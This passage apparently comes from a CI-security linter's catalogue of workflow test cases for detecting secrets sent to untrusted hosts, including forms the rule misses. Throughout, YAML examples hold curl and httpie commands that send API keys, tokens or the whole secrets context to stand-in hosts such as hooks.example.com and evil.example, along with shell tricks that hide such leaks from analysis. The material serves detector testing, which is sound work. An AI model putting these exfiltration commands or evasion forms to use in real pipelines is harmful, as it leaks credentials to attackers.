  - true negatives:
    - untrusted-destination.github.yml (workflow, true-negative)
      ```yaml
      # situation: on push, a step sends the secret API_KEY to GitHub's API with
      #   curl.
      # reason: GitHub decrypts the secrets to give them to the run, so the
      #   request gives GitHub nothing GitHub does not hold.
      # attack: the attacker takes over the server of the destination, by a breach
      #   of the vendor or by registering the domain when the domain lapses.
      # attack-run-behavior: the request goes to GitHub's API, which holds the
      #   secrets already.
      on: push
      jobs:
        j:
          runs-on: ubuntu-latest
          steps:
            - shell: bash
              env:
                API_KEY: ${{ secrets.API_KEY }}
              run: |
                curl -fsS -H "Authorization: Bearer $API_KEY" "$GITHUB_API_URL/repos/o/r/releases"
      ```
    - untrusted-destination.hosted-localhost.yml (workflow, true-negative)
      ```yaml
      # situation: on push, a job on a GitHub-hosted runner sends the secret
      #   API_KEY with curl to localhost:9200.
      # reason: a GitHub-hosted runner is a machine of the job alone, so only what
      #   the job starts listens on localhost.
      # attack: the attacker takes over the server of the destination, by a breach
      #   of the vendor or by registering the domain when the domain lapses.
      # attack-run-behavior: the request goes to a process the job started on the
      #   runner.
      on: push
      jobs:
        j:
          runs-on: ubuntu-latest
          steps:
            - shell: bash
              env:
                API_KEY: ${{ secrets.API_KEY }}
              run: |
                curl -fsS -u "admin:$API_KEY" http://localhost:9200/_cluster/health
      ```
    - untrusted-destination.local-in-function.yml (workflow, true-negative)
      ```yaml
      # situation: on push, a step calls a function that declares key local and sets
      #   key to the secret API_KEY, and then sends key to hooks.example.com
      #   with curl.
      # reason: a local variable ends with the function, so key is empty when
      #   curl runs, and the request carries no secret.
      # attack: the attacker takes over the server of the destination, by a breach
      #   of the vendor or by registering the domain when the domain lapses.
      # attack-run-behavior: curl sends an empty header, and the server of the
      #   attacker gets no secret.
      on: push
      jobs:
        j:
          runs-on: ubuntu-latest
          steps:
            - env:
                API_KEY: ${{ secrets.API_KEY }}
              run: |
                f() { local key; key=$API_KEY; }
                f
                curl -fsS -H "x-apikey: $key" https://hooks.example.com/
      ```
    - untrusted-destination.never-runs.yml (workflow, true-negative)
      ```yaml
      # situation: on push, the job whose id is disabled has if: false, and the job
      #   whose id is on-failure needs the job build and has if: needs.build.result
      #   == 'failure'; each of the two jobs sends the secret API_KEY with curl to
      #   www.virustotal.com, and no facts file says that www.virustotal.com is
      #   trusted with the secret.
      # reason: GitHub skips the job disabled because the if of the job disabled is
      #   false. The if of the job on-failure calls no status function, so GitHub
      #   evaluates the if of the job on-failure only when the job build succeeded;
      #   needs.build.result is then success, and the if is false. When the job
      #   build fails or is skipped, GitHub skips the job on-failure without
      #   evaluating the if. So neither job runs
      #   (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/data/reusables/actions/jobs/section-using-conditions-to-control-job-execution.md).
      # attack: whoever runs the server of www.virustotal.com, or takes the server
      #   over, reads the requests that the server receives.
      # attack-run-behavior: GitHub skips the job disabled and the job on-failure,
      #   so curl does not run, and no request carries the secret API_KEY.
      on: push
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - run: echo built
        disabled:
          if: false
          runs-on: ubuntu-latest
          steps:
            - shell: bash
              env:
                API_KEY: ${{ secrets.API_KEY }}
              run: |
                curl -fsS -H "x-apikey: $API_KEY" https://www.virustotal.com/api/v3/files -F file=@dist/app.zip
        on-failure:
          needs: build
          if: needs.build.result == 'failure'
          runs-on: ubuntu-latest
          steps:
            - shell: bash
              env:
                API_KEY: ${{ secrets.API_KEY }}
              run: |
                curl -fsS -H "x-apikey: $API_KEY" https://www.virustotal.com/api/v3/files -F file=@dist/app.zip
      ```
    - untrusted-destination.service.yml (workflow, true-negative)
      ```yaml
      # situation: on push, a step sends the secret API_KEY with curl to the
      #   service search of the job.
      # reason: the job starts the container of the service for itself, so only
      #   the job's own container receives the key.
      # attack: the attacker takes over the server of the destination, by a breach
      #   of the vendor or by registering the domain when the domain lapses.
      # attack-run-behavior: the request goes to the container of the service,
      #   which the job started.
      on: push
      jobs:
        j:
          runs-on: ubuntu-latest
          services:
            search:
              image: elasticsearch:8.15.0
          steps:
            - shell: bash
              env:
                API_KEY: ${{ secrets.API_KEY }}
              run: |
                curl -fsS -u "elastic:$API_KEY" http://search:9200/_cluster/health
      ```
    - untrusted-destination.subshell-assignment.yml (workflow, true-negative)
      ```yaml
      # situation: on push, a step sets t to the secret TOKEN inside ( ... ), and
      #   after the ( ... ) sends t with curl to evil.example.
      # reason: bash runs ( ... ) in a subshell, so after the subshell t is empty,
      #   and curl sends nothing of the secret.
      # attack: the owner of evil.example reads what curl sends.
      # attack-run-behavior: curl sends an empty body.
      on: push
      permissions: {}
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - env:
                S: ${{ secrets.TOKEN }}
              run: |
                ( t=$S )
                curl -d "$t" https://evil.example
      ```
    - untrusted-destination.transform-attributes.yml (workflow, true-negative)
      ```yaml
      # situation: on push, a step sends to hooks.example.com with curl the
      #   attributes of the variable that holds the secret API_KEY (${API_KEY@a}).
      # reason: ${API_KEY@a} writes the letters of the attributes of API_KEY (x
      #   for a variable of env), not the key, so the request does not carry the
      #   key.
      # attack: the attacker takes over the server of the destination, by a breach
      #   of the vendor or by registering the domain when the domain lapses.
      # attack-run-behavior: curl sends the letter x to hooks.example.com; the key
      #   is not in the request.
      on: push
      jobs:
        j:
          runs-on: ubuntu-latest
          steps:
            - env:
                API_KEY: ${{ secrets.API_KEY }}
              run: curl -fsS -d "${API_KEY@a}" https://hooks.example.com/
      ```

### undetected forms

- split-env-name: a variable named by the part of a key of env before the first =, such as A for the key A=B, which the runner sets to the rest of the key, =, and the value (in a step in a job's container, to the rest of the key alone): the rule reads a variable of env by a key equal to the name of the variable
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: split-env-name.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step has the env key T=X with the secret DEPLOY_TOKEN,
    #   and sends $T in a header to a host that the workflow writes.
    # reason: a todo (the same file): the runner sets the variable T to X= and
    #   the secret, so the request carries the secret to the host.
    # cause: the rule reads a variable of env by a key equal to its name, and
    #   no key is T.
    # attack: the one who controls the host reads the header.
    # attack-run-behavior: curl sends Authorization: Bearer X= and the value of
    #   DEPLOY_TOKEN to status.example.
    on: push
    permissions: {}
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              T=X: ${{ secrets.DEPLOY_TOKEN }}
            run: |
              curl -fsS -H "Authorization: Bearer $T" "https://status.example/deploy"
    ```
- secret-input: a secret that a step of an action reads by inputs.&lt;name>, either because a caller among the files that the linter reads gives the secret under with:, or because the default of inputs.&lt;name> is \${{ github.token }}: the rule does not follow the value under with: into inputs.&lt;name> and does not read the default of inputs.&lt;name>; when no caller of the action is among the files that the linter reads, whether inputs.&lt;name> holds a secret is not known
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: repo-file)
  - example: called/action.yml (action-metadata, undetected)
    ```yaml
    # situation: the composite action sends inputs.api-key, and inputs.token,
    #   whose default is the token of the job, to www.virustotal.com with curl;
    #   ci.yml calls the action on push and gives the secret API_KEY as api-key.
    # reason: a todo (a file of the repository): the requests carry the secret
    #   and the token to www.virustotal.com, and whoever holds the server can use
    #   the secret and the token.
    # cause: the rule does not follow the value under with: of the caller into
    #   inputs.api-key of the action, and does not read the default of
    #   inputs.token, so the rule does not know that inputs.api-key holds a secret
    #   and inputs.token holds the token.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: the server, now the attacker's, receives the value of
    #   API_KEY and the token of the job, and uses the two.
    name: scan
    description: scan the build
    inputs:
      api-key:
        description: the API key of VirusTotal
      token:
        description: the token of the job
        default: ${{ github.token }}
    runs:
      using: composite
      steps:
        - env:
            API_KEY: ${{ inputs.api-key }}
            GH_TOKEN: ${{ inputs.token }}
          run: |
            curl -fsS -H "x-apikey: $API_KEY" https://www.virustotal.com/api/v3/files -F file=@dist/app.zip
            curl -fsS -H "Authorization: token $GH_TOKEN" https://www.virustotal.com/api/v3/comments
          shell: bash
    ```
    - .github/workflows/ci.yml (workflow)
      ```yaml
      on: push
      jobs:
        scan:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
            - uses: ./called
              with:
                api-key: ${{ secrets.API_KEY }}
      ```
- attacker-destination: a request whose host an attacker's value may decide, or whose control is not analyzed
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: other-rule (rule: request-forgery)
  - example: attacker-destination.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step sends the secret API_KEY with curl to the
    #   host that the issue's title names.
    # reason: the attacker decides the host; request-forgery reports the
    #   request.
    # cause: the rule leaves a destination an attacker may decide to
    #   request-forgery.
    # attack: the attacker opens an issue titled attacker.example.
    # attack-run-behavior: curl sends the key to attacker.example.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              curl -fsS -H "x-apikey: $API_KEY" "https://${{ github.event.issue.title }}/v1"
    ```
- whole-secrets: the whole secrets context in a request (toJSON(secrets)): the fact names one secret
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: other-rule (rule: secret-exposure)
  - example: whole-secrets.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step sends the whole secrets context to
    #   hooks.example.com with curl.
    # reason: every secret goes to the host; secret-exposure reports
    #   toJSON(secrets).
    # cause: the fact names one secret, so the rule does not report the whole
    #   context.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: the workflow sends the request as it always does, and
    #   the server, now the attacker's, logs the value of API_KEY.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - shell: bash
            env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              curl -fsS -d "${{ toJSON(secrets) }}" https://hooks.example.com/
    ```
- other-command: a request sent by a command other than curl, wget and gh api: httpie, nc, dig, a script of python or node
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: other-command.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step sends the secret API_KEY with httpie to
    #   hooks.example.com.
    # reason: a todo (the same file): the request carries the key to the host as
    #   curl's would.
    # cause: the rule reads the requests of curl, wget and gh api only.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: the workflow sends the request as it always does, and
    #   the server, now the attacker's, logs the value of API_KEY.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - shell: bash
            env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              http --ignore-stdin POST https://hooks.example.com/ "x-apikey:$API_KEY"
    ```
- action-request: a secret an action sends where its with or its code says, such as an upload of a coverage report
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: fact)
  - example: action-request.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step gives the secret CODECOV_TOKEN to an action
    #   that uploads a coverage report.
    # reason: a todo (a fact): the action sends the token where its code says.
    # cause: the rule reads the requests of a run, not those an action sends.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: the workflow sends the request as it always does, and
    #   the server, now the attacker's, logs the value of API_KEY.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: codecov/codecov-action@v4
            with:
              token: ${{ secrets.CODECOV_TOKEN }}
    ```
- file: a secret that reaches the request through a file
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: file.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step writes the secret API_KEY into headers.txt and
    #   sends the headers of the file to hooks.example.com with curl.
    # reason: a todo (the same file): the file has the secret.
    # cause: the rule does not follow a secret through a file.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: the workflow sends the request as it always does, and
    #   the server, now the attacker's, logs the value of API_KEY.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - shell: bash
            env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              printf 'x-apikey: %s\n' "$API_KEY" > headers.txt
              curl -fsS -H @headers.txt https://hooks.example.com/
    ```
- config-file: a credential from a file curl reads: -K, the default .curlrc, --netrc
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: limitation (decided by: run-time)
  - example: config-file.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step sends a request with curl to hooks.example.com,
    #   with the options of the file ci/curl.conf of the repository.
    # reason: a limitation (run time): the file may hold a header with a
    #   credential.
    # cause: the rule reads the words of the command, not the files curl reads.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: the workflow sends the request as it always does, and
    #   the server, now the attacker's, logs the value of API_KEY.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - run: |
              curl -fsS -K ci/curl.conf https://hooks.example.com/
    ```
- unwalked-place: a command in a place the rule does not walk: the commands of an arm of case, \$( ) in the words of case
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: unwalked-place.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step sends the secret API_KEY to hooks.example.com
    #   with curl, in an arm of case.
    # reason: a todo (the same file): the request carries the key to the host.
    # cause: the rule does not walk the commands of an arm of case.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: on a push to main, curl sends the key to
    #   hooks.example.com, whose server, now the attacker's, logs the key.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              case "$GITHUB_REF_NAME" in
                main) curl -fsS -H "x-apikey: $API_KEY" https://hooks.example.com/ ;;
              esac
    ```
- proxy: a secret sent to a proxy, such as with -U or --proxy-user of curl: the rule reads the destination of the request, not its proxy
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: proxy.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step sends a request to GitHub's API through the
    #   proxy proxy.example.com, with the secret API_KEY as the password of the
    #   proxy.
    # reason: a todo (the same file): the proxy receives the password.
    # cause: the rule reads the destination of the request, not its proxy.
    # attack: the attacker takes over proxy.example.com.
    # attack-run-behavior: curl sends the password to the proxy, whose server,
    #   now the attacker's, logs the password.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              curl -fsS -x http://proxy.example.com:3128 -U "ci:$API_KEY" https://api.github.com/meta
    ```
- other-shell: a run of pwsh, cmd or python, and a run whose shell the rule cannot determine to be bash or sh: a shell: value whose command is not bash or sh, such as pwsh -File {0}; a shell: value of bash or sh with an option that the rule does not read, such as bash -c 'make' {0}, bash -v {0} or bash -O extglob {0}; a shell: value that names bash or sh by a path, such as /usr/bin/bash -e {0}, on a runner where the rule does not know that the path exists (any runner other than one whose runs-on is a single label that starts with ubuntu-, or with macos- for /bin/bash and /bin/sh) or in a step of a composite action; a shell: that is an expression; or a step without shell: whose job and workflow have no defaults.run.shell and whose job has a runs-on that is not a single label that starts with ubuntu-, macos- or windows-, such as self-hosted or an expression: the rule reads the runs of bash and sh only
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: other-shell.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step of pwsh sends the secret API_KEY to
    #   hooks.example.com with curl.
    # reason: a todo (the same file): the request carries the key.
    # cause: the rule reads runs of bash and sh only.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: the workflow sends the request as it always does, and
    #   the server, now the attacker's, logs the value of API_KEY.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - shell: pwsh
            env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              curl -fsS -H "x-apikey: $env:API_KEY" https://hooks.example.com/
    ```
- lastpipe-not-literal: an assignment or an exec in the last command of a pipeline after a shopt -s lastpipe whose option name the script does not write as a literal word (shopt -s "\$o"): bash runs the last command of the pipeline in the shell that runs the pipeline, so the assignment or the exec stays after the pipeline, and the rule reads the last command as a command in a subshell
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: lastpipe-not-literal.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step turns lastpipe on with shopt -s and the option
    #   name in a variable, sets key to the secret API_KEY in the last command of
    #   a pipeline, and sends key to hooks.example.com with curl.
    # reason: a todo (the same file): key holds the secret when curl runs, so
    #   the request carries the secret to the host.
    # cause: the rule follows lastpipe only after shopt -s lastpipe written as
    #   literal words, and reads the last command as a command in a subshell.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: curl sends the secret to hooks.example.com, whose
    #   server, now the attacker's, logs the secret.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              o=lastpipe
              shopt -s "$o"
              true | key=$API_KEY
              curl -fsS -H "x-apikey: $key" https://hooks.example.com/
    ```
- name-not-literal: an assignment whose variable name the script does not write as a literal word (n=key; declare "\$n=\$X"; or read -r "\$n"): bash assigns the word after = (with declare) or the line that read reads (with read) to the variable whose name is the value of n, and the rule does not read the assignment
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: name-not-literal.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step sets n to the name key, assigns the secret
    #   API_KEY to the variable that n names with declare, and sends key to
    #   hooks.example.com with curl.
    # reason: a todo (the same file): key holds the secret when curl runs, so
    #   the request carries the secret to the host.
    # cause: the variable name of the assignment is not a literal word, so the
    #   rule does not read the assignment.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: curl sends the secret to hooks.example.com, whose
    #   server, now the attacker's, logs the secret.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              n=key
              declare "$n=$API_KEY"
              curl -fsS -H "x-apikey: $key" https://hooks.example.com/
    ```
- recursive-unset-local: a variable that a shell function unsets inside a recursive call of a function, where a function between the two calls made the variable local (f() { if &#91; -z "\$inner" ]; then inner=1; h; else g; fi; }; h() { s=x; local s=y; f; }; g() { unset s; }): bash takes away the local of the nearest calling function that made the variable local, and the variable then holds the value from before the nearest calling function made the variable local; the rule reads the recursive call where the first call of the function runs, without the calls in between, and does not read the value that the unset reveals
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: recursive-unset-local.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step defines f, which calls h on the first call of f
    #   and calls g on the second call of f; h sets s to the secret API_KEY, makes
    #   s local with safe, and calls f. g unsets s and sends $s in a header to
    #   hooks.example.com with curl.
    # reason: a todo (the same file): in the second call of f, the unset in g
    #   takes away the local that h made, and s holds the value that h set before
    #   h made s local: the secret, which the request carries to the host.
    # cause: the rule reads the second call of f, which f makes through h, where
    #   the first call of f runs, without the call of h, so the rule does not read
    #   the value that the unset reveals.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: curl sends the secret to hooks.example.com, whose
    #   server, now the attacker's, logs the secret.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              f() { if [ -z "$inner" ]; then inner=1; h; else g; fi; }
              g() { unset s; curl -s -H "x-apikey: $s" https://hooks.example.com/x; }
              h() { s="$API_KEY"; local s=safe; f; }
              f
    ```
- unset-caller-local: a variable that a shell function unsets after a calling function made the variable local, when an assignment to the variable or a second unset of the variable follows the unset (s=x; reset() { unset s; }; point() { local s=y; reset; s=z; }; point): bash takes away the local of the calling function, so that the assignment after the unset sets the variable outside the calling function, and a second unset takes away the local of the next calling function or unsets the variable outside the functions; the rule keeps the local of the calling function after the unset, gives the variable back the value from before the calling function made the variable local when the calling function returns, and reads the second unset as the first unset
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: unset-caller-local.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step sets s to x and defines reset, which unsets s;
    #   point makes s local with safe, calls reset, and sets s to the secret
    #   API_KEY. The step calls point and then sends $s in a header to
    #   hooks.example.com with curl.
    # reason: a todo (the same file): the unset in reset takes away the local that
    #   point made, so the assignment in point after reset sets the s of the step:
    #   the secret, which the request carries to the host.
    # cause: the rule keeps the local of point after the unset in reset, and gives
    #   s back x when point returns, so the rule does not read the value that
    #   point set after reset.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: curl sends the secret to hooks.example.com, whose
    #   server, now the attacker's, logs the secret.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              s=x
              reset() { unset s; }
              point() { local s=safe; reset; s="$API_KEY"; }
              point
              curl -s -H "x-apikey: $s" https://hooks.example.com/x
    ```
- several-destination-values: a request whose host comes from a variable that more than one assignment of the script may set before the request (if c; then U=https://hooks.example.com; else U=https://api.github.com; fi; curl -H "x-apikey: \$KEY" "\$U/x"): the rule reads the host of the request from the assignment that comes last in the text of the script, and does not judge the hosts of the other assignments
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: several-destination-values.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step sets U to https://hooks.example.com when the
    #   ref is refs/heads/main and to https://api.github.com otherwise, and
    #   sends the secret API_KEY to "$U/x" with curl.
    # reason: a todo (the same file): on a push to main, U holds
    #   https://hooks.example.com when curl runs, so the request carries the
    #   secret to hooks.example.com.
    # cause: the rule reads the host from the assignment that comes last in the
    #   script, U=https://api.github.com, a host of GitHub, and does not judge
    #   the host of the other assignment.
    # attack: the attacker takes over the server of hooks.example.com, by a
    #   breach of the vendor or by registering the domain when the domain
    #   lapses.
    # attack-run-behavior: on a push to main, curl sends the secret to
    #   hooks.example.com, whose server, now the attacker's, logs the secret.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              if [ "$GITHUB_REF" = refs/heads/main ]; then U=https://hooks.example.com; else U=https://api.github.com; fi
              curl -fsS -H "x-apikey: $API_KEY" "$U/x"
    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/secret-exfiltration-unanswered, whose content
    #   is the workflow of the true positive untrusted-destination
    #   (untrusted-destination.arithmetic.yml) of the rule, with on:
    #   workflow_call in place of the on of
    #   untrusted-destination.arithmetic.yml. The linter has no answer of the
    #   fact workflow.definition for the reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: curl sends the secret to hooks.example.com, whose
    #   server, now the attacker's, logs the secret.
    on: push
    permissions: {}
    jobs:
      c:
        uses: example-org/secret-exfiltration-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### inconclusive

- destination-unknown: a request that carries a secret to a destination whose host has no name a file of facts can answer for: the output of \$( ), a value the script builds, the response of an API
  - disposition: limitation (decided by: run-time)
  - example: destination-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: on push, a step reads a URL from the response of GitHub's API
    #   and sends the secret API_KEY there with curl.
    # reason: the host of the destination is what the response says at run time,
    #   which no file of facts can name.
    # attack: the attacker makes the response name a host of the attacker's own,
    #   where the attacker can write what the API returns.
    # attack-run-behavior: curl sends the request with API_KEY to the host the
    #   response names.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - shell: bash
            env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              URL=$(curl -fsS https://api.github.com/repos/o/r/releases/latest | jq -r .assets[0].url)
              curl -fsS -H "Authorization: Bearer $API_KEY" "$URL"
    ```
- call-body-unknown: a call of a function after the rule has read the bodies of the functions at 4,096 calls in the script, such as a call after a chain of functions in which each function calls the next function twice (f1() { f0; f0; }; ... f13() { f12; f12; }; f13; w): the rule does not read the bodies of the functions at the calls past the 4,096 calls, so the rule does not decide the assignments, the writes, the prints and the requests in the bodies of the functions at the calls past the 4,096 calls
  - disposition: todo (needs: same-file)
  - example: call-body-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: on push, a step defines a function w that sets key to the
    #   secret API_KEY,
    #   runs a chain of functions f0 to f13 in which each function calls the
    #   function before it twice (16,383 calls), calls w, and sends key to
    #   hooks.example.com with curl.
    # reason: the call of w comes after the 4,096 calls of functions that the
    #   rule follows when it reads what the commands of the step print, so the
    #   rule does not read the body of w for the prints and reports an
    #   Inconclusive at the call of w; the rule still reads the value that w
    #   assigns, and also reports the request that carries the secret.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: curl sends the secret to hooks.example.com, whose
    #   server, now the attacker's, logs the secret.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              w() { key="$API_KEY"; }
              f0() { :; }
              f1() { f0; f0; }
              f2() { f1; f1; }
              f3() { f2; f2; }
              f4() { f3; f3; }
              f5() { f4; f4; }
              f6() { f5; f5; }
              f7() { f6; f6; }
              f8() { f7; f7; }
              f9() { f8; f8; }
              f10() { f9; f9; }
              f11() { f10; f10; }
              f12() { f11; f11; }
              f13() { f12; f12; }
              f13
              w
              curl -fsS -H "x-apikey: $key" https://hooks.example.com/
    ```
- remote-callee-unknown: a job that calls a reusable workflow of another repository, when the linter asked the fact workflow.definition for the reusable workflow and got no answer (the token that the linter uses cannot read the file, the file is larger than the limit, or the linter has used up the requests it may send to the GitHub API), or when the call is deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact: the rule does not read the jobs and the steps of the reusable workflow
  - disposition: todo (needs: fact)
  - example: remote-callee-unknown.yml (workflow, inconclusive)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/secret-exfiltration-unknown, whose content is
    #   the workflow of the true positive untrusted-destination
    #   (untrusted-destination.arithmetic.yml) of the rule, with on:
    #   workflow_call in place of the on of
    #   untrusted-destination.arithmetic.yml. The linter asked the fact
    #   workflow.definition for the reusable workflow and got no answer.
    # reason: what the jobs of the reusable workflow do is in the file that the
    #   linter could not read; whoever changes the uses, such as the author of a
    #   pull request, can name a reusable workflow that the token that the
    #   linter uses cannot read.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: curl sends the secret to hooks.example.com, whose
    #   server, now the attacker's, logs the secret.
    on: push
    permissions: {}
    jobs:
      c:
        uses: example-org/secret-exfiltration-unknown/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### false positive forms

- branch-not-run: an assignment in a branch of if, after && or ||, in the body of a loop, or in the body of a function called there, that bash does not run (if false; then s=\$KEY; fi): the rule does not read the value of a condition, so the rule reads the assignment as one that may run, and reads the variable as one that may hold the value of the assignment
  - finding kinds: secret-exfiltration.untrusted-destination
  - disposition: todo (needs: same-file)
  - example: branch-not-run.yml (workflow, false-positive)
    ```yaml
    # situation: on push, a step sets key to the secret API_KEY in an if whose
    #   condition is false, and sends key to hooks.example.com with curl.
    # reason: bash does not run the branch, so key is empty when curl runs, and
    #   the request carries no secret.
    # cause: the rule does not read the value of the condition of an if, and
    #   reads the assignment in the branch as one that may run.
    # attack: the attacker takes over the server of the destination, by a breach
    #   of the vendor or by registering the domain when the domain lapses.
    # attack-run-behavior: curl sends an empty header, and the server of the
    #   attacker gets no secret.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              if false; then key=$API_KEY; fi
              curl -fsS -H "x-apikey: $key" https://hooks.example.com/
    ```
- trusted-destination: a destination that is the service the secret is for, such as an API key sent to the API that issued the key
  - finding kinds: secret-exfiltration.untrusted-destination
  - fact kinds:
    - request.destination-trusted (provider: user-supplied, answer that removes the finding: true)
  - example: trusted-destination.yml (workflow, false-positive)
    ```yaml
    # situation: on push, a step uploads a build to VirusTotal with curl and the
